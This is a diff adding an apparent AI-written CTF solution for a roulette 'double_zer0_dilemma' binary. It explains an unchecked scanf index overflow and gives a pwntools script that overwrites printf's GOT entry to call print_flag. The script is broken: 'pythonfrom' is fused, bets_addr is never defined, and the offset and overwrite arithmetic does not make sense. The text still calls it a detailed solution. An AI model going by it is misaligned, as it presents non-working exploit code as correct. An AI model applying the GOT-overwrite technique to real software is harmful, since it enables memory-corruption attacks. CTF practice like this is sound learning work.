@@ -1,0 +1,56 @@
+
+Here is a detailed solution to solve the "double_zer0_dilemma" CTF challenge:
+
+Analyze the decompiled C code to understand what the program is doing:
+
+It is a casino game that lets you bet on a random number between 0-36
+It calls the play() function twice to let you play twice
+It stores the bets in the "bets" array, indexed by the bet number
+It uses scanf to read your bet number and amount, with no checks
+This means we can overflow bets and overwrite pointers by inputting large integers
+
+
+The key vulnerabilities:
+
+scanf allows entering arbitrary integers with no checks
+This allows overwriting pointers stored after bets array
+We can overwrite the printf pointer or puts pointer
+Then make it point to the print_flag function to print the flag
+
+
+Strategy to get the flag:
+
+Determine memory addresses needed
+Calculate integer inputs to overflow bets array
+Overflow printf pointer to point to print_flag function
+Enter bet numbers to call the overwritten printf
+
+
+The python exploit code:
+
+pythonfrom pwn import *
+
+elf = ELF('./double_zer0_dilemma')
+p = process('./double_zer0_dilemma')
+
+print_flag_addr = elf.symbols['print_flag']
+printf_addr = elf.got['printf']
+
+log.info(f"print_flag address: {hex(print_flag_addr)}")
+log.info(f"printf GOT address: {hex(printf_addr)}")
+
+offset = (printf_addr - bets_addr) // 8
+overwrite = print_flag_addr - offset
+
+log.info(f"Overwriting printf GOT with {hex(overwrite)}")
+
+p.recvuntil('number (0-36) you think the roulette will land on: \n')
+p.sendline(str(overwrite).encode())
+p.recvuntil('amount you want to wager: \n') 
+p.sendline(str(overwrite).encode())
+
+p.recvuntil('number (0-36) you think the roulette will land on: \n')
+p.sendline(b'1')
+p.interactive()
+This overwrites the printf pointer with the address of print_flag function. Then it enters a fake bet to call printf, which now prints the flag.
+Let me know if you need any clarification or have additional questions!
